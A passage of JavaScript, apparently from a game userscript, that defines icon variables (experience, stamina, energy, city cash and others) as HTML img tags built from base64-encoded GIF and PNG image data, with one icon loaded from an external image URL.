    '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' +
    '" />';

var experienceIcon = '<img src="data:image/gif;base64,' +
    'R0lGODlhEAAQAOZyAAABAQBAUAARFQAFBgAUGQANEHvl/wMJCwBIWwBLXgAZIABLXQArNAUOED/Z/0Ta/wAbIgBDVAArNSnX/wB5lwBedUrb/xHQ/wB4lgYQEwA3RQTC8gCEpgCy3hPE8Ifm/wBgeBZ+lYbn/wAv' +
    'OyhSXAC/7wBfdwCPsyU6QFOSogAiKinU/wDG+ABbcgAGCCTT/wTO/wGbwkDZ/3nk/wDC8gMFBV/h/znY/wARFjHV/16Pmyx2iAAKDAAKDQBJWwAICgBmfxU4QAEDBEfK6gCiywA7SQBngRFEUQ3P/yXE6SE8QgB0' +
    'kgOjyy7X/xjR/yg7QB0uMhxCSxU9RxtvhAI6SA7Q/3nM4QBuigB6mRc4QAo3QQBiewA0QQKfx0nb/wB3lQUSFQBlfwGgyAONsAACAwCWvSk7QAAqNRrR/QTB8RvO+1Pc/wIJCwjQ/xrL+AA8SwidwgCFqAAAAAAA' +
    'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAEAAHIALAAAAAAQABAAAAeagHKCg3INGYSIiCQ7iY1yKUNCjoQ1VhZUk4NQIl5jiWBRSihPZjozD25HWUFaRQQHUzI2Bh8GazkvTRMeXRUF' +
    'giNMajcOK05IG2UgKogFSywXVTAlJwg4jnBtNB1EWFyObElpcVcYFGE8jVJoHAEMPkZfGo0hMQECcgILQCYAiGRiEvQY9ONNCwiIJGxxkehMBH+DFAxwRGBiIAA7Cg==' +
    '" />';

var omgIcon = '<img src="data:image/png;base64,' +
    'iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAIhSURBVDjLlZPrThNRFIWJicmJz6BWiYbIkYDEG0Jb' +
    'BiitDQgm0PuFXqSAtKXtpE2hNuoPTXwSnwtExd6w0pl2OtPlrphKLSXhx07OZM769qy19wwAGLhM1ddC184+d18QMzoq3lfsD3LZ7Y3XbE5DL6Atzuyilc5Ciyd7IHVfgNcDYTQ2tvDr5crn6uLSvX+Av2Lk36FF' +
    'pSVENDe3OxDZu8apO5rROJDLo30+Nlvj5RnTlVNAKs1aCVFr7b4BPn6Cls21AWgEQlz2+Dl1h7IdA+i97A/geP65WhbmrnZZ0GIJpr6OqZqYAd5/gJpKox4Mg7pD2YoC2b0/54rJQuJZdm6Izcgma4TW1WZ0h+y8' +
    'BfbyJMwBmSxkjw+VObNanp5h/adwGhaTXF4NWbLj9gEONyCmUZmd10pGgf1/vwcgOT3tUQE0DdicwIod2EmSbwsKE1P8QoDkcHPJ5YESjgBJkYQpIEZ2KEB51Y6y3ojvY+P8XEDN7uKS0w0ltA7QGCWHCxSWWpwy' +
    'aCeLy0BkA7UXyyg8fIzDoWHeBaDN4tQdSvAVdU1Aok+nsNTipIEVnkywo/FHatVkBoIhnFisOBoZxcGtQd4B0GYJNZsDSiAEadUBCkstPtN3Avs2Msa+Dt9XfxoFSNYF/Bh9gP0bOqHLAm2WUF1YQskwrVFYPWkf' +
    '3h1iXwbvqGfFPSGW9Eah8HSS9fuZDnS32f71m8KFY7xs/QZyu6TH2+2+FAAAAABJRU5ErkJggg==' +
    '" />';

var pauseIcon = '<img src="data:image/gif;base64,' +
    'R0lGODlhEAAQAMQAAAAAAP///4i1GpXCHJO/G5C9G4u4Goq2GpnGHZTBHI26G4eyGpzJHa3aIafVIKfUIKHOH5/NH6vYIaTSILPgIq7bIbLfIrHeIv3++f///wAAAAAAAAAAAAAAAAAAAAAAACH5BAEAABkALAAA' +
    'AAAQABAAAAVyYBZB0+NITVpdl0VRDDOWZ9qsLYXEs4mqLMtgJyP5bCtLYsgz1oCE5Q6DIVF/twJhMKSOqM+GQrukyqjHhmG8NTOoNJRhraVOq/HDgU7tYnoOenNsUk0lCwKChExFEwuIimSMI4+Qe4tEERmViZeS' +
    'OxkhADs=' +
    '" />';

var staminaIcon = '<img src="data:image/gif;base64,' +
    'R0lGODlhEAAQANU/ANVbbJmZmkVHRikpKVV5Wq2fnux4itCxt8fIx76WnBYWFjU1NYyNjaVweJOSlNxqdysVF3t6fgcGBnR0daOhp76/vnZze7lcZOaMmq6Bh7KtrpN8hIJCSaCXmIGFi6qurmVjYm1jZGhpapOL' +
    'jHRoa1EpLnJvdt9KUeyQoZ+foLKJkeBpfE5QUO/w8FRJTOJTXpSVmudVZNHR0sdkb91wfICAgIR0d7t3g2VeZamnq7NWXPJugGRWXH9BR4BfXAAAACH5BAEAAD8ALAAAAAAQABAAAAaJwJ9wSCwaj0OJUFBTiByB' +
    'QIohWAxSFeEA8SFUWjJExOKBRSZCBYlAGBU6HQvFQclFhJtXiMVAaDQmA0UDADsJAiA8LjgBCkUJJzE+IgsiCgMTSkMDNAYABJcDCgQOmkI2KwYNggsCLI5FGQ8oKrCmRTcPGAe3Rw0XM7xIQyU9HDrDQxDLvcnO' +
    'QkEAOwo=' +
    '" />';

var updateBadIcon = '<img src="data:image/png;base64,' +
    'iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAIhSURBVDjLlZPrThNRFIWJicmJz6BWiYbIkYDEG0Jb' +
    'BiitDQgm0PuFXqSAtKXtpE2hNuoPTXwSnwtExd6w0pl2OtPlrphKLSXhx07OZM769qy19wwAGLhM1ddC184+d18QMzoq3lfsD3LZ7Y3XbE5DL6Atzuyilc5Ciyd7IHVfgNcDYTQ2tvDr5crn6uLSvX+Av2Lk36FF' +
    'pSVENDe3OxDZu8apO5rROJDLo30+Nlvj5RnTlVNAKs1aCVFr7b4BPn6Cls21AWgEQlz2+Dl1h7IdA+i97A/geP65WhbmrnZZ0GIJpr6OqZqYAd5/gJpKox4Mg7pD2YoC2b0/54rJQuJZdm6Izcgma4TW1WZ0h+y8' +
    'BfbyJMwBmSxkjw+VObNanp5h/adwGhaTXF4NWbLj9gEONyCmUZmd10pGgf1/vwcgOT3tUQE0DdicwIod2EmSbwsKE1P8QoDkcHPJ5YESjgBJkYQpIEZ2KEB51Y6y3ojvY+P8XEDN7uKS0w0ltA7QGCWHCxSWWpwy' +
    'aCeLy0BkA7UXyyg8fIzDoWHeBaDN4tQdSvAVdU1Aok+nsNTipIEVnkywo/FHatVkBoIhnFisOBoZxcGtQd4B0GYJNZsDSiAEadUBCkstPtN3Avs2Msa+Dt9XfxoFSNYF/Bh9gP0bOqHLAm2WUF1YQskwrVFYPWkf' +
    '3h1iXwbvqGfFPSGW9Eah8HSS9fuZDnS32f71m8KFY7xs/QZyu6TH2+2+FAAAAABJRU5ErkJggg==' +
    '" />';

var processIcon = '<img src="data:image/png;base64,' +
    'iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAADfElEQVR42nWSfUxTZxTGnwtjtIa2l5WFVhCqIwg4pWSyLbBkFcY2M8yYQiQmY200LPtjmTUxQSCsgKsxWVamTlziLDBhH7oxhlhmqWABt2UYhhIg' +
    'VvCGAa0tlUv1UqAfd29r5ka2nX/PeX7v8z7nUPifOlZv1G1/PuNDgSAK/f1DTZXV5Zr/mqMeC+rO00Lhk71UBM9yS5xGKhW1l79XrLzvXkJXl5mdmZneSKYNQqFAueTl3qqq1DJrAI0nf1jQHNhJ+/wB/GQaRFKy' +
    'DGlpKXA4FjHvdsJu/4PNzc2mJRIx2r66wM7OzWbVVFcwjwFnTn1/d1/Z64qhX+9Avj4WklgBxsZsWFn1ITk5Ac9s2oCIyMjwm+0dHWxpye7YNQ709V8YyjS7Dt6ddGJyykY6QSQkyhATsw4POQ/YRRYqlQrBQBCf' +
    'NTY21dVUhjOhTjVcNEjjROpA0EcXlxTA1G1FBBWBVGLf5XIgOjoK2zK3wely4behG8jPz0dnZyeWvN4+2+TUNaq1pZvfu+9VPPB44b7PYmDgF7zw4nZYrb3svNulDXmMj4837Fe/TV+9NoDUjGchEcUgKpJCU+vX' +
    'oC792M/nvpQNp9NDXrTDu8xBLFmHHotZW3XkcEPIZs3R4+qiwp3GUIDORS+SFAosr6yip8cCSl9/tkgkFhpycrMVQd4Pf2AFZJ3oMl3WVlU8AhypPabe8+YbRolYjLkFjoT5BKwDgyzDMJ+GQ9R/dPrgKwU5Brlc' +
    'jpujt5CXp0JrWxs7PWvX+khoclm84f1yDX3ZYkViSjrGJiZg7rFoz31c20DpjzYWbc1MbS8szCPB+DB4/TrZ/2ZsSJBheOQWgjzwnHIrZuz3cKnvZ+QVvAY/uRVTtwk3RkZ3EMBpdeGuHcb0LWmkESR7X4altw+0' +
    'RARFclIYEBJPMHPIeVkFithf9vkxcnMUV8xmTfgLn5/5cjgtPUVpu3ObzcxS0ukZW4jIgSlmGj5CkK1PhEQah2EiGr9tI0cmxej4OGOsO7TxUQb6EwoeAYTu29h8ni8t3QuWW4Gb9YQBghgRVom7tm8v4vihA9Se' +
    'D3Qqf5BnOk7W/n3Kf9VZYwtfXFIMxzyLc80tv0cLhPR+dZniHufDN9+145PD767R/AtQUa3TPRX39DsPOC/NejxZXj9Pp6Zs6p1beMjOOpzNF07U6/45/yfp9IvQT2YsKQAAAABJRU5ErkJggg==' +
    '" />';

var energyPackIcon = '<img src="data:image/gif;base64,' +
    'R0lGODlhGAAYAOZ/AFcqAO96APLpzPXHMv3012g2AIZRAvniksS3nue6RHZCAPvoqfjXa9KdAO9pAPO+EbCJKePXw51oAbGVZS8oD2FbR/767NurF/bSXe+UAPPELdOsQ++HANC/q62PTQwIAufEV3JbErF8AOW9' +
    'N49hIfTBG/bZeNvEiubTl/TEJvzsu/DLUtW9cKVyAaJ3MLiEAtq5VfXcjcZ4MbyJAOKtAdmlAO65Dd2oAPn4+PXLP/K/FSUUAO2+ItaiAPLu6+u2CXRoP+PJeOfJZvzwysqVAO/JS6NuBEUdAP745v39/f778LWA' +
    'AOvm4at2APDFQfG8EOaxBMSRAPXy8O9fAKRyDjcyIbSBC////++kALOEGtvMt+izBuK2MOXbt+3iyZ5uG/n39t+tDPHPX+3ALfCjDLOlduvGTcCNAPbhnMueD1hKHd3AZNVNAMKFI+OyD++6AOXPhr+njN3SybiG' +
    'DO/IAI1gAP734fC+Gs+gH6J8AO+sAOPATevSf+Pa0uG0IQAAACH5BAEAAH8ALAAAAAAYABgAAAf/gH+Cg38fVUBlKHATQFUfhJCDHxURFkqXFkgEC2tqj5GCFAgWFpsYAzkmC0NDBxAUoFUCSUMrbjc9uTU1F2so' +
    'fH6whBQCSjE8NTNNEszNLTMsQls7kghKB3c3SxFX3d7eJ0FOeZ8VBAQDP0Qu3Q5T71NsOBEvCSZpAIVdFgw6NEtxrshwQPAdDikkXoQxwaWFITsEcthoIEFKkgABHGTEkeSIgRc3VpgRsQOInQUpoMyYkEQGB4wB' +
    'uiWZ6aXHGDEiAHiwYOJJjRZyrmTgQPQlxita5tS4w2BJgT0WMEyEcKVNhqtDiV5BYIQIFB0YRCgYYYfBxBNXcKhNgPVKHCMN7KA8KVHESAEIBA7woEFEQoEkOLBgIZNkQpMGW57oSMGlzpEQKlSkuyH2ihM9V8B4' +
    'ENHjx5MHDzRcMLCDAgMVGPy96MDkzRUfLqx0/vyghAYrBT58SHMATYobTXzQucLExYwbnkE/SDEawCMAI9BgAN6tz5czN2zQrs2jBQBqhepsiJHgTJIIVKLQ0A5aRwkeuI98+rOjxYYgMNJEabD+gfsSKcBXgHOQ' +
    '7FBHFjAIAYITGqSQwgADiGYEAARGskMBBkCwAQhiiFEEF3hQoQAA8oEiyAc7AFCAAga0OCCFO8xnYiEoHkHhETHKOEggADsK' +
    '" />';

var energyIcon = '<img src="data:image/gif;base64,' +
    'R0lGODlhDQANANU/AEs+IPfHHj0zIPesHveqHmhPIPfCHvfAHi8uIfexHve4HktEIPe9HvfEHve7HveoHvfFHiAiIWhZIPeuHiAgIS8wIdqfHqGBH/fWHvfiHve6HlpWIMyYH/fJHve3HsyXH+nGHr6SH/fbHj05' +
    'IOmfHoV0H/ezHlpEIFpPIK+hH/fMHve0Hsy0H9q0HmhUIKGSH6GWH/fKHvfUHvevHtqqHve5HvfPHvepHvfIHve+Hve2HoV9Hz0xIGhYIEs9IP///yH5BAEAAD8ALAAAAAANAA0AAAZgwJ+wMCDcHg8ST8i0JGaT' +
    '4okpdCl0K1OiQBXSGA6NggMA+ATCXsNwOIBrng/61+oEIOtDLkRhLhYoMTh3F11CJTY2KhKGPwgYMiAjjT8vIiwIlBUZKRGUPzA7n0Iboz9BADs=' +
    '" />';

var killedMobsterIcon = '<img src="http://playerscripts.com/images/mwap_graphics/icon_killed.png" />';

var yeahIcon = '<img src="data:image/png;base64,' +
    'iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAGrSURBVDjLvZPZLkNhFIV75zjvYm7VGFNCqoZUJ+ro' +
    'KUUpjRuqp61Wq0NKDMelGGqOxBSUIBKXWtWGZxAvobr8lWjChRgSF//dv9be+9trCwAI/vIE/26gXmviW5bqnb8yUK028qZjPfoPWEj4Ku5HBspgAz941IXZeze8N1bottSo8BTZviVWrEh546EO03EXpuJOdG63' +
    'otJbjBKHkEp/Ml6yNYYzpuezWL4s5VMtT8acCMQcb5XL3eJE8VgBlR7BeMGW9Z4yT9y1CeyucuhdTGDxfftaBO7G4L+zg91UocxVmCiy51NpiP3n2treUPujL8xhOjYOzZYsQWANyRYlU4Y9Br6oHd5bDh0bCpSO' +
    'ixJiWx71YY09J5pM/WEbzFcDmHvwwBu2wnikg+lEj4mwBe5bC5h1OUqcwpdC60dxegRmR06TyjCF9G9z+qM2uCJmuMJmaNZaUrCSIi6X+jJIBBYtW5Cge7cd7sgoHDfDaAvKQGAlRZYc6ltJlMxX03UzlaRlBdQr' +
    'zSCwksLRbOpHUSb7pcsnxCCwngvM2Rm/ugUCi84fycr4l2t8Bb6iqTxSCgNIAAAAAElFTkSuQmCC' +
    '" />';

var plussignIcon = '<img src="data:image/gif;base64,' +
    'R0lGODlhEAAQALMPAO3r6wxTAGmvZqjQppHFj4O8gANoAACCAJ3JmkqiRzCXLQB3ABGOEl6pWv38/P///yH5BAEAAA8ALAAAAAAQABAAAART8MlJqwUuO2CpG0ghON30hQ1ZPmeRqBSmDYTwahxbEDxRNIyDcKFy' +
    'CI7HBGPBNBiKiigjuHAaAoGi8NDEerMSWcaJ1Wwsjmt5xfrCOg43W3xmsyMAOwo=' +
    '" />';

var cashIcon = '<img src="data:image/png;base64,' +
    'iVBORw0KGgoAAAANSUhEUgAAAAkAAAANCAYAAAB7AEQGAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAAAZdEVYdFNvZnR3YXJlAFBhaW50Lk5FVCB2My41LjVJivzg' +
    'AAABA0lEQVQoU3XRwUcEURzA8adDhw7xdNpLh6dbp0SX6L+IDp06jG7deqeu6RBLrBppicSOjkk8koqkIYq9zaGVPZSmJUUxfn3fM7LbaPh4v/nOY+YZpfqulswlyPvb73zwPathkd8Xe5IVJ2mnuHC+hU3N9xmN' +
    'FHL3tVtBt2r7ecpCbj92AmYDjdjfP3y2MlV/nHSQ614jYLYw/i3lHKn19kQMuXzZGnDz2uzS58M3raXjBjnkrFuvaL+dOrV6VZuGgYO4zuaA86dGrlbcmCAcldVgo2y+B2r5eDSFIPIbWTWysvmeqKWjEQv5R0YP' +
    'J1WLh8MRYuQQJLDQlV+0sD+UQP4++AGT2OU9X81LRgAAAABJRU5ErkJggg==' +
    '" />';

var cashCubaIcon = '<img src="data:image/gif;base64,' +
    'R0lGODlhEAAQANU/AMa6tRRvU+Tc1N/X0BX1ALlpih0XF+3i3szDuvHP4Qv1AVclM3BsbCu1J+q50xjVBcaAoMpsmFmYY+LSzO3j2bt1ptqKtXQzUtPGu9rMxLKkm/Pm49Z3qcJcjY1ebrQ7cChYKrtTf85soFWY' +
    'VzCLOguNMMm2q2pTVMCbk1FKSqhEaOWoyALeCJtFXWaHZxzsA9jGwtRvpdLCwdLKxqtidtC0rgTKBYx5euDOyrNce9e/upiYmJI0TuTV0evh2P///yH5BAEAAD8ALAAAAAAQABAAAAaKwJ9wSCwaj8hk0cDzeAzK' +
    'xWeViBQuAZCx9bEkOJBdIKCQLBZDUw0SKkjGrFEl0r6cEIOMhvQo2VwVXg4xNBkYAwMIDQoEDCoiDg4cBT0DAAICigQKABgoOR0dOBszPwwAAA0EBDKYAzoTGwcpRCAPLzA+uj4HBzdHBhoCPhQUBwBKpgg+E1DJ' +
    'z0pBADs=' +
    '" />';

var cashMoscowIcon = '<img src="data:image/gif;base64,' +
    'R0lGODlhEAAQANU6ACkFBt4aIvFCSdoaIaITGV8LDvNhZq8VG/mtsPbbAChtEekbI8AXHfFITvvIyu8oL/JRV7kWHNwaIfXkAca/E/AwOOcbI8fFJvA4P5iiGfJNU/A0O/NZX/aBhX0PE/V2e9W8Be8tNPFGTL0W' +
    'HcrDBPLPAPNbYeAaIt7bAoMPFIgQFeQbIveanUV5E/JYXmJbD7MVG+zMA22NC9XDD+8kLM0YH4EPE5IRFvA5QJ6rQQAAAAAAAAAAAAAAAAAAAAAAACH5BAEAADoALAAAAAAQABAAAAaMQJ1wSCwaj8hkERAZDABK' +
    'T4Dl0GwIKZsxEvg4DKaGQjFZeQpDQmBDw+RaCtSloQmJbgUGg0DIgGQkc14ILhEETgMMFBMJGRIQCAgGEg8nBwsLNRQJEwcjARIYAQEdBzoABTAzJQkWFRUDAQ8dBlBDLyAxDwK8AgYcaEYAKgsCEBAcFkqnBwI4' +
    'tsvRSUEAOw==' +
    '" />';

var cashBangkokIcon = '<img src="data:image/gif;base64,' +
    'R0lGODlhEAAQANU/ACIGBdl/RV8bFUkOCooZGJtNGsBfIKo4IPvmrcpkE3PNKZUcHZk9D/SJILlGIyBeN9p5Efnah3nNKMpoNGOoMO+USb0/HfKhHtE0G/a9NvS2ImusQO9/HOSPUvGSGu+JRfKyZG6zJ0uLL3AW' +
    'CmC6Jn3KJ3vGKYEbBe+GGYYaG/CJIFypJPOoHvOdJKEpH7k2HTZUHCNoLPSyH5QXDCx3IG60L/SCEfjRapNNILkpC2WZUu6EFtF0LXcSFHYyGgAAACH5BAEAAD8ALAAAAAAQABAAAAaMwJ9wSCwaj8hkEcDAYADK' +
    'EeSGuHByp5mRAckgNK3G46GwjQZDQYGz8+hiD9KmcUGpZoPFQiAQhWgrc14RMgwCB4gLFAoSIgksEREaCQYvBA4OLhQSCgQ+BQkeEAUgBD8AAyk1JRIWExM4BQYgFVBDMCEmBgG8ARUfaEYAPQ4BHR0fFkqnBAE8' +
    'tsvRSUEAOw==' +
    '" />';

var cashVegasIcon = '<img src="data:image/png;base64,' +
    'iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAAAZdEVYdFNvZnR3YXJlAFBhaW50Lk5FVCB2My41LjVJivzg' +
    'AAADXklEQVQ4T32TD0zUdRjGv3Ac4N3ujuOPHBweh4eAwCGCwCk1PeQQvI4QEGhB624QFoIDtQzbNO20urRZQEyBjWWsXPZH0k7K4Qbl1hS0stI27I8sMMOO0FVin36zrc3F+m7vvtv7vnve9332PELM8U4csRef' +
    'H3r4vZtX6y7P+urH1ttTTquD1ZuUwXLlXP3/5jISlqbsd6//DPbx5VP5THQ8yC12U+5YxhLTIu7LMI7v3mYsmxOkqqigqPGhmtkKRzGT40188WENRz1rOevJY/tjOdjsaRw95gBcvN0bvesekLX2+JTDnbW3V+VY' +
